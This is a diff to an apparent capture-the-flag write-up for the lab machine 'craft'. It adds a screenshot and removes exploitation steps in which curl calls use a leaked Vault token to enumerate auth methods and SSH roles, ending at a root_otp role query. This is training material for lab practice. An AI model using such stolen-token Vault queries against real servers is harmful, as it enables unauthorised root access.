@@ -112,6 +112,8 @@ Finished
 ```
 ### web page Enumeration
 
+![](./screens/1.png)
+
 clicking on api redirects to:
 
 ```
@@ -392,18 +394,7 @@ f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
 
 ### Exploitation
 
-```shell
-kali㉿kali)-[~/machines/craft]
-└─$ curl -sk -H "X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9" https://vault.craft.htb/v1/sys/auth
-{"token/":{"accessor":"auth_token_a38d00ba","config":{"default_lease_ttl":0,"max_lease_ttl":0,"plugin_name":""},"description":"token based credentials","local":false,"options":null,"seal_wrap":false,"type":"token"},"userpass/":{"accessor":"auth_userpass_4580aeca","config":{"default_lease_ttl":0,"listing_visibility":"unauth","max_lease_ttl":0,"plugin_name":""},"description":"","local":false,"options":{},"seal_wrap":false,"type":"userpass"},"request_id":"9e1ce8f5-ea15-5292-c878-45c9cc22cfc8","lease_id":"","renewable":false,"lease_duration":0,"data":{"token/":{"accessor":"auth_token_a38d00ba","config":{"default_lease_ttl":0,"max_lease_ttl":0,"plugin_name":""},"description":"token based credentials","local":false,"options":null,"seal_wrap":false,"type":"token"},"userpass/":{"accessor":"auth_userpass_4580aeca","config":{"default_lease_ttl":0,"listing_visibility":"unauth","max_lease_ttl":0,"plugin_name":""},"description":"","local":false,"options":{},"seal_wrap":false,"type":"userpass"}},"wrap_info":null,"warnings":null,"auth":null}
 
-```
-
-```
- curl -sk -H "X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9" https://vault.craft.htb/v1/ssh/roles?list=true
-{"request_id":"fc144309-0766-8faa-8023-00994f291478","lease_id":"","renewable":false,"lease_duration":0,"data":{"key_info":{"root_otp":{"key_type":"otp"}},"keys":["root_otp"]},"wrap_info":null,"warnings":null,"auth":null}
-
-```
 
 ```
 curl -sk -H "X-Vault-Token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9" https://vault.craft.htb/v1/ssh/roles/root_otp
